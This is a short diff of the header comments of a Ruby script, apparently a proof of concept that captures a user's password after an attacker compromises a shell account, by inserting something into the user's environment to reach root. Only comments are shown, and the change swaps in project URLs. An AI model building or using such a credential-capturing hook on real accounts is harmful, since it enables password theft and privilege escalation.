@@ -1,5 +1,5 @@
 #!/usr/bin/env ruby
-#HISPAGAOTS.org
+# http://HISPAGATOS.org  http://binaryfreedom.info
 # probe of comcept to capture user password.
 # when attacker compromise a regular use shell account, he can
 # jump into root or steal user password by adding into the user enviroment
